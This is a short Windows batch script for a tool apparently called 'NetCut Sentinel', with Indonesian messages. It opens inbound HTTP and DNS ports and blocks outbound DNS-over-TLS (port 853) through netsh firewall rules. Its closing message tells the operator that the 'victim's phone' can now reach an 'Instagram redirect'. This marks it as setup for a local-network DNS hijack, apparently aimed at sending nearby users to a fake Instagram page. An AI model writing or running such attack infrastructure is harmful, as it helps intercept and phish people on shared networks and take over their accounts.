@echo off
echo =======================================================
echo NetCut Sentinel - Captive Portal Firewall Configuration
echo =======================================================
echo.
echo Sedang mendaftarkan Port 80 (HTTP) dan Port 53 (DNS) ke Windows Firewall...
echo.

netsh advfirewall firewall delete rule name="NetCut Sentinel Portal HTTP" >nul 2>&1
netsh advfirewall firewall delete rule name="NetCut Sentinel DNS" >nul 2>&1
netsh advfirewall firewall delete rule name="NetCut Sentinel Block DoT" >nul 2>&1

netsh advfirewall firewall add rule name="NetCut Sentinel Portal HTTP" dir=in action=allow protocol=TCP localport=80 profile=any
netsh advfirewall firewall add rule name="NetCut Sentinel DNS" dir=in action=allow protocol=UDP localport=53 profile=any
netsh advfirewall firewall add rule name="NetCut Sentinel Block DoT" dir=out action=block protocol=TCP remoteport=853 profile=any

echo.
echo =======================================================
echo [SUKSES] Port 80 dan Port 53 sekarang TERBUKA untuk LAN!
echo HP korban sekarang dapat mengakses redirect Instagram.
echo =======================================================
pause
